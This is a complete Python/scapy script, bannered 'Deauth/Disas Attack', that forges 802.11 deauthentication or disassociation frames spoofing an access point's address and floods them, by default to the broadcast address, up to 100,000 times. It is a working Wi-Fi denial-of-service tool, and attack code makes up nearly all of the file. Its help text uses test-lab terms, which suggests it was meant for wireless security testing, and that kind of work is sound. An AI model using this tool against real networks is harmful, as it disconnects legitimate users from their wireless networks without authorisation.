#!/usr/bin/python
from scapy.all import *  # version 2.4.0
import argparse
import sys


def banner():
    bnr = "\033[36mDeauth/Disas Attack\033[00m 1.02a by <verifsec@gmail.com>\n"
    print(bnr)


def deauth_pkt(bssid, target):
    return RadioTap()/Dot11(type=0, subtype=12, addr1=target,
                            addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)


def disas_pkt(bssid, target):
    return RadioTap()/Dot11(type=0, subtype=10, addr1=target,
                            addr2=bssid, addr3=bssid)/Dot11Disas(reason=6)


def upper(message, index):
    tmp = message[index:]
    return message[:index] + tmp.capitalize()


if __name__ == "__main__":
    banner()
    broadcast = 'ff:ff:ff:ff:ff:ff'
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--iface', help='802.11 iface(monitor)',required=True)
    parser.add_argument('-b', '--bssid', help='APUT MAC Address', required=True)
    parser.add_argument('-t', '--target', help='STAUT MAC Address', default=broadcast)
    parser.add_argument('-m', '--mode', help='"disas" or "deauth"', required=True)
    args = parser.parse_args()

    iface = args.iface
    bssid = args.bssid
    target = args.target
    mode = args.mode
    
    if mode == 'deauth':
        packet = deauth_pkt(bssid, target)
    elif mode == 'disas':
        packet = disas_pkt(bssid, target)
    else:
        sys.exit('\033[31m[-]\033[00m Unknown mode.(Select "deauth/disas")')

    msg = 'Sending the ' + mode + ' flame from ' + bssid + ' to ' + target
    cyl = ['/', '-', '\\', '|']

    print('\033[32m[+]\033[00m Starting now ...')

    try:
        for i in range(100000):
            sendp(packet, verbose=0, iface=iface)
            sys.stdout.write('\r[%s] %s' % (cyl[i % 4], upper(msg, i % len(msg))))
            sys.stdout.flush()        
    except KeyboardInterrupt:
        print("\n\n\033[31m+++ Testing aborted by user +++\033[00m")
        sys.exit("\033[32m[+]\033[00m Are you OK? Hopefully it's nothing.")
    except Exception:
        sys.exit("\033[31m[-]\033[00m Something is wrong. Use your brain.")
        
    print("\n\033[32m[+]\033[00m Finish. Hopefully it's nothing.")
